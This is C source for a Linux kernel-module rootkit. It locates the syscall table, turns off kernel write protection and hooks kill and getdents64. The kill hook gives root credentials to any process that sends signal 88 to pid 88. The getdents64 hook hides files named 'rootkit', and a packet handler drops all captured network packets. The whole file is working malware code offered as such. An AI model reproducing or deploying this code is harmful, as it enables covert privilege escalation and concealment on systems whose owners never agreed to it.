#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/in.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/types.h>
#include <linux/socket.h>
#include <linux/inet.h>

#define ETH_P_ALL       0x0003
#if 0 //64 bits machine //__WORDSIZE == 64
#define KERN_MEM_BEGIN 0xffffffff81000000
#define KERN_MEM_END 0xffffffff81e42000
#else
#define KERN_MEM_BEGIN 0xc0000000
#define KERN_MEM_END 0xd0000000
#endif /* __WORDSIZE == 64 */

unsigned long **find_syscall_table(void)
{
    /*  Find the syscall table 
     *  search in memory the adress of a function of the syscall table (sys_close)
     */
     unsigned long **sctable;
     unsigned long int i = KERN_MEM_BEGIN;
	 
	    while ( i < KERN_MEM_END) {
	 
	        sctable = (unsigned long **)i;
	 
	        if ( sctable[__NR_close] == (unsigned long *) sys_close) {
	 
	            return &sctable[0];
	 
	        }
	         
	        i += sizeof(void *);
	    }
	 
	    return NULL;
     
}


void disable_wp(void)
{
    __asm__("push   %eax\n\t"
            "mov    %cr0,%eax;\n\t"
            "and     $~(1 << 16),%eax;\n\t"
            "mov    %eax,%cr0;\n\t"
            "wbinvd\n\t"
            "pop    %eax"
           );
           
}

void enable_wp(void)
{

    __asm__("push   %eax\n\t"
            "mov    %cr0,%eax;\n\t"
            "or     $(1 << 16),%eax;\n\t"
            "mov    %eax,%cr0;\n\t"
            "wbinvd\n\t"
            "pop    %eax"
           );
           
}


/* Adress of the syscall table */
unsigned long ** syscall_table ;

/* save packet type */
struct packet_type pt;

/* save module */
 struct module *mod;
    
/* -------------------------------------------------------------------- */

asmlinkage long (*orig_getdents64) (unsigned int fd,  struct linux_dirent64 __user *dirent,  unsigned int count);

asmlinkage long hacked_getdents64 (unsigned int fd,  struct linux_dirent64 __user *dirent, unsigned int count){

	int ret= orig_getdents64( fd,  dirent, count);
	{

	unsigned long off = 0;
	struct linux_dirent64 __user *dir;	

	for(off=0;off<ret;){

		dir=(void*)dirent+off;
		
		if((strstr(dir->d_name, "rootkit")) != NULL){
		printk(KERN_ALERT "hide %s",dir->d_name);
		   ret-=dir->d_reclen;
			if(dir->d_reclen+off<ret)
			   memmove ((void*)dir,(void*)((void*)dir+dir->d_reclen), (size_t) (ret-off));

		}
		else
		off += dir->d_reclen;
		}
 	}
return ret;
}

asmlinkage long (*orig_call) (pid_t pid, int sig);

asmlinkage long hacked_call( pid_t pid, int sig)
{
    
    /* Hacked function */
    if((pid ==88) &&(sig==88))
    {
    struct task_struct *cur_task;
    struct cred *credz;
/*obtain root access*/
    cur_task=current;
    credz=cur_task->cred;
    credz->uid=0;
    credz->gid=0;
    credz->suid=0;
    credz->sgid=0;
    credz->euid=0;
    credz->egid=0;     
    printk(KERN_ALERT "KILL 88 88 HIJACKED");
    }
    
/*   show hided module  */    
    if((pid ==22) &&(sig==22))
    {  
/*  attach save module to the list of module by seaching snd module */    	
    list_add(&mod->list,&find_module("snd")->list);    
    printk(KERN_ALERT "show module");
    }
    return orig_call(pid,sig);
}


/* -------------------------------------------------------------------- */

int toto(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,struct net_device *dev2)
{
kfree_skb(skb);
printk(KERN_ALERT "ping ping");
return 0;
}
int init_module(void)
{

    syscall_table = find_syscall_table();

    if (syscall_table == 0)
    {
        printk(KERN_INFO "System call table not found!\n");
        return 1;
    }
    printk(KERN_INFO "System call found at : 0x%lx\n", (unsigned long)syscall_table);
	
/*  hide module  lsmod */    
   // mod=THIS_MODULE;
   // list_del(&THIS_MODULE->list);
   
   
   //remove interfacepacket layer2
   __dev_remove_pack( &pt );
    
    disable_wp();

/*  Save the adress of the original syscall */
   orig_call= (void *) syscall_table[__NR_kill];
   
/*  Replace the syscall in the table */
  syscall_table[__NR_kill] = (void*) hacked_call;
  
  
/*  Save the adress of the original syscall */
  orig_getdents64= (void *) syscall_table[__NR_getdents64];
   
/*  Replace the syscall in the table */
  syscall_table[__NR_getdents64] = (void*) hacked_getdents64;
  
  
  
/*  stuff for network, call toto function  */
pt.type = htons(ETH_P_ALL);
// pt.dev = 0;
pt.func = toto;
dev_add_pack(&pt);
  

   enable_wp(); 
	
    printk(KERN_INFO "Rootkit is loaded!\n");

    return 0;
}

void cleanup_module(void)
{

    disable_wp();

    /* Set the orignal call*/
  syscall_table[/*  Sycall Number*/ __NR_kill] = (void*) orig_call;
  
  syscall_table[ __NR_getdents64] = (void*) orig_getdents64;

    enable_wp(); 

    printk(KERN_INFO "Rootkit is unloaded!\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Peondusud");
MODULE_DESCRIPTION("peonsud rootkit module");
